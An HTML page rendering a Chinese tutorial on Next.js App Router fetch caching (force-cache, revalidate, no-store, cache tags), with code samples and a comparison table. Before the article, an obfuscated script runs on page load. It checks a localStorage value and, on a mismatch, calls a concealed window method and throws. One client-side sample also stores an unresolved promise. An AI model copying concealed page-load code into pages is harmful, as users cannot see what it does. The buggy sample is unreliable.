<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x4a04(l,s){var p=_0x2d90();return(_0x4a04=function(s,n){var a=p[s-=453];void 0===_0x4a04.SSjVGv&&(_0x4a04.pThwFV=function(s,n){var a,t=[],l=0,p="";for(s=(s=>{for(var n,a,t="",l="",p=0,e=0;a=s.charAt(e++);~a&&(n=p%4?64*n+a:a,p++%4)&&(t+=String.fromCharCode(255&n>>(-2*p&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,o=t.length;c<o;c++)l+="%"+("00"+t.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(l)})(s),e=0;e<256;e++)t[e]=e;for(e=0;e<256;e++)l=(l+t[e]+n.charCodeAt(e%n.length))%256,a=t[e],t[e]=t[l],t[l]=a;for(var e=0,l=0,c=0;c<s.length;c++)a=t[e=(e+1)%256],t[e]=t[l=(l+t[e])%256],t[l]=a,p+=String.fromCharCode(s.charCodeAt(c)^t[(t[e]+t[l])%256]);return p},l=arguments,_0x4a04.SSjVGv=!0);var s=s+p[0],t=l[s];return t?a=t:(void 0===_0x4a04.mQzOqr&&(_0x4a04.mQzOqr=!0),a=_0x4a04.pThwFV(a,n),l[s]=a),a})(l,s)}var _0x4fe50c=_0x4a04;if((()=>{for(var s=_0x4a04,n=_0x2d90();;)try{if(577101==-parseInt(s(470,"(OpE"))+parseInt(s(457,"F(eJ"))/2*(parseInt(s(471,")Vqo"))/3)+parseInt(s(461,"Fs6e"))/4*(parseInt(s(465,"e$B%"))/5)+-parseInt(s(479,"e$B%"))/6+-parseInt(s(463,"@R6z"))/7*(-parseInt(s(464,"L9vi"))/8)+parseInt(s(476,"oSIS"))/9*(parseInt(s(456,"e$B%"))/10)+parseInt(s(475,"NOP3"))/11*(-parseInt(s(453,"DMAz"))/12))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x4fe50c(462,"NOP3")](_0x4fe50c(473,"[SGm"))!=_0x4fe50c(455,"]y3e"))throw window[_0x4fe50c(482,"tE*%")][_0x4fe50c(481,"^Q[y")](_0x4fe50c(468,"oSIS")),Error();function _0x2d90(){var s=["oSoAW6xcR8o9WPldVSks","nCoqt8k9W5PAuhHd","FsH8erRdSSkzzci","a3WVcCoPcHtdJIy","i8o0WQDmudlcU8k5wColnmkFWQa","WOJcQxqWvSktWQFdPsJdJSog","wSoVoSofDSk4WQBdQghdQSkobG","vCoPFqT9WPtcJM0sW4ne","W6LhW6aSW7GSWRqcdwZdMCkL","ovFcGSkktNddRSk1W5RdICkk","D10gdg12ca","bxiIqCoCwHBcTW","qrBcUSk/fL3dMSktvG","dNKPq1VcSSk2qaJdGIFcNq","sSkilxtdPG","W6TiW6WRWO5nWRiMgN0","abFcPh/dJSk1WOtdHMfzkG","CfNcVxWauCo8","W5KUlCkvs8oXWPDP","WORdRG/cGmovgCoGW5ZcLmoOF8klW60","s1tdQbaQW51bomoWWRfaW6Sq","DCkLW6qYeMpdPW","WPPisXL4CLaDW5KuW71P","uSkbjSkyW4bCWQL+WRy","W68CWPTdWOrSWPW","WPldM8kiWOFcGSoWfvnTW4OAWQZcKG","tL7dPrfwWROvi8onWR4","W5tdQZvWfSoMW4hcQXFdNSoXW5ddOWjZW7P9FxtcPSolWRenWPtcMSok","WOtdKJzhgSolxmoqgXBcS04","CCkNdmk+nK/cQhRcMIO4uq"];return(_0x2d90=function(){return s})()}document.title="Next.js App Router fetch API的缓存策略",document.getElementById("article").innerHTML='<div><p>是的，Next.js App Router通过**<code>fetch</code> API的缓存策略**  提供了比Pages Router更灵活、更直观的数据获取方式。这种设计让你可以根据不同页面的需求，<strong>精确控制数据的缓存时间和更新频率</strong>  ，从而在性能和内容新鲜度之间取得平衡。</p>\n<h3><strong>1. App Router中<code>fetch</code>的缓存策略</strong></h3>\n<h4><strong>(1) 静态缓存（Static Caching）</strong></h4>\n<pre><code class="language-tsx"><span class="hljs-comment">// 永久缓存（构建时执行一次，永远使用缓存）</span>\n<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>);\n<span class="hljs-comment">// 等效于：</span>\n<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>, {\n  <span class="hljs-attr">cache</span>: <span class="hljs-string">&#x27;force-cache&#x27;</span>, <span class="hljs-comment">// 默认值</span>\n});\n</code></pre>\n<ul>\n<li><strong>行为</strong>  ：在构建时执行一次数据获取，生成静态HTML，后续请求直接使用缓存。</li>\n<li><strong>适用场景</strong>  ：内容极少变化的页面（如博客文章、产品详情）。</li>\n</ul>\n<h4><strong>(2) 增量静态再生（ISR）</strong></h4>\n<pre><code class="language-tsx"><span class="hljs-comment">// 5分钟后重新验证（等效于Pages Router的revalidate: 300）</span>\n<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>, {\n  <span class="hljs-attr">next</span>: { <span class="hljs-attr">revalidate</span>: <span class="hljs-number">300</span> }, <span class="hljs-comment">// 秒为单位</span>\n});\n</code></pre>\n<ul>\n<li><strong>行为</strong>  ：\n<ul>\n<li>构建时生成初始HTML。</li>\n<li>首次请求返回缓存的HTML。</li>\n<li>超过300秒后，下一个请求会触发后台重新验证并更新缓存。</li>\n</ul>\n</li>\n</ul>\n<h4><strong>(3) 每次请求都重新获取（SSR行为）</strong></h4>\n<pre><code class="language-tsx"><span class="hljs-comment">// 禁用缓存，每次请求都重新获取数据（等效于getServerSideProps）</span>\n<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>, {\n  <span class="hljs-attr">cache</span>: <span class="hljs-string">&#x27;no-store&#x27;</span>,\n});\n</code></pre>\n<ul>\n<li><strong>行为</strong>  ：每次请求都在服务器端重新执行数据获取，生成新的HTML。</li>\n<li><strong>适用场景</strong>  ：实时数据（如股票价格、用户特定内容）。</li>\n</ul>\n<h4><strong>(4) 静态生成但允许手动刷新</strong></h4>\n<pre><code class="language-tsx"><span class="hljs-comment">// 静态生成，但可以通过API路由手动触发刷新</span>\n<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>, {\n  <span class="hljs-attr">next</span>: { <span class="hljs-attr">tags</span>: [<span class="hljs-string">&#x27;posts&#x27;</span>] }, <span class="hljs-comment">// 添加缓存标签</span>\n});\n</code></pre>\n<ul>\n<li><strong>配合手动刷新</strong>  ：<pre><code class="language-tsx"><span class="hljs-comment">// app/api/revalidate/route.ts</span>\n<span class="hljs-keyword">import</span> { revalidateTag } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/cache&#x27;</span>;\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">Request</span></span>) {\n  <span class="hljs-title function_">revalidateTag</span>(<span class="hljs-string">&#x27;posts&#x27;</span>); <span class="hljs-comment">// 刷新所有带有&#x27;posts&#x27;标签的缓存</span>\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Response</span>.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">revalidated</span>: <span class="hljs-literal">true</span> });\n}\n</code></pre>\n</li>\n</ul>\n<h3><strong>2. 缓存策略对比表</strong></h3>\n<table>\n<thead>\n<tr>\n<th><strong>策略</strong></th>\n<th><strong>缓存行为</strong></th>\n<th><strong>等效Pages Router功能</strong></th>\n<th><strong>适用场景</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>cache: \'force-cache\'</code></td>\n<td>永久缓存（构建时执行一次）</td>\n<td><code>getStaticProps</code>无revalidate</td>\n<td>静态内容（如博客、文档）</td>\n</tr>\n<tr>\n<td><code>next: { revalidate }</code></td>\n<td>定期重新验证（ISR）</td>\n<td><code>getStaticProps</code> + revalidate</td>\n<td>内容定期更新（如新闻、商品列表）</td>\n</tr>\n<tr>\n<td><code>cache: \'no-store\'</code></td>\n<td>每次请求都重新获取（无缓存）</td>\n<td><code>getServerSideProps</code></td>\n<td>实时数据（如仪表盘、用户会话）</td>\n</tr>\n<tr>\n<td><code>next: { tags }</code></td>\n<td>基于标签的手动刷新</td>\n<td>无直接等效（需自定义API）</td>\n<td>内容更新不频繁但需手动触发（如CMS更新）</td>\n</tr>\n</tbody>\n</table>\n<h3><strong>3. 动态路由与缓存策略结合</strong></h3>\n<p>对于动态路由（如<code>app/products/[id]/page.tsx</code>），可以这样控制缓存：</p>\n<pre><code class="language-tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateStaticParams</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> products = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/products&#x27;</span>, {\n    <span class="hljs-attr">cache</span>: <span class="hljs-string">&#x27;force-cache&#x27;</span>, <span class="hljs-comment">// 构建时获取一次</span>\n  }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> res.<span class="hljs-title function_">json</span>());\n\n  <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">product</span>) =&gt;</span> ({ <span class="hljs-attr">id</span>: product.<span class="hljs-property">id</span> }));\n}\n\n<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductPage</span>(<span class="hljs-params">{ params }</span>) {\n  <span class="hljs-comment">// 每个产品页面5分钟重新验证一次</span>\n  <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/products/<span class="hljs-subst">${params.id}</span>`</span>, {\n    <span class="hljs-attr">next</span>: { <span class="hljs-attr">revalidate</span>: <span class="hljs-number">300</span> },\n  }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> res.<span class="hljs-title function_">json</span>());\n\n  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{/* 渲染产品 */}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;\n}\n</code></pre>\n<h3><strong>4. 与客户端组件的数据获取结合</strong></h3>\n<p>对于需要客户端交互的数据（如用户特定内容），可以在Client Components中使用<code>useEffect</code>或SWR等库：</p>\n<pre><code class="language-tsx"><span class="hljs-string">&#x27;use client&#x27;</span>;\n<span class="hljs-keyword">import</span> { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserDashboard</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">const</span> [userData, setUserData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);\n\n  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-comment">// 客户端获取用户数据（不参与服务器端渲染）</span>\n    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/user-data&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> <span class="hljs-title function_">setUserData</span>(res.<span class="hljs-title function_">json</span>()));\n  }, []);\n\n  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{/* 渲染用户仪表盘 */}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;\n}\n</code></pre>\n<h3><strong>5. 最佳实践</strong></h3>\n<ol>\n<li><strong>优先使用静态缓存</strong>  ：对于不经常变化的内容，默认使用<code>cache: \'force-cache\'</code>。</li>\n<li><strong>合理设置revalidate时间</strong>  ：根据内容更新频率调整<code>revalidate</code>值（如新闻网站设为60秒，博客设为3600秒）。</li>\n<li><strong>混合使用策略</strong>  ：\n<ul>\n<li>页面骨架和公共内容：SSG/ISR。</li>\n<li>实时数据：客户端获取或<code>cache: \'no-store\'</code>。</li>\n</ul>\n</li>\n<li><strong>监控性能</strong>  ：使用Next.js的内置分析工具或第三方工具监控缓存命中率和页面加载时间。</li>\n</ol>\n<h3><strong>总结</strong></h3>\n<p>App Router通过<code>fetch</code>的缓存策略提供了<strong>细粒度的数据获取控制</strong>  ，让你可以：</p>\n<ul>\n<li>轻松实现SSG、ISR和SSR，无需记忆不同的API（如<code>getStaticProps</code>和<code>getServerSideProps</code>）。</li>\n<li>根据路由和组件的需求，灵活组合缓存策略。</li>\n<li>通过标签系统实现更复杂的缓存管理。</li>\n</ul>\n<p>这种设计大大简化了渲染策略的实现，同时保持了高性能和灵活性。</p>\n</div>'</script></body></html>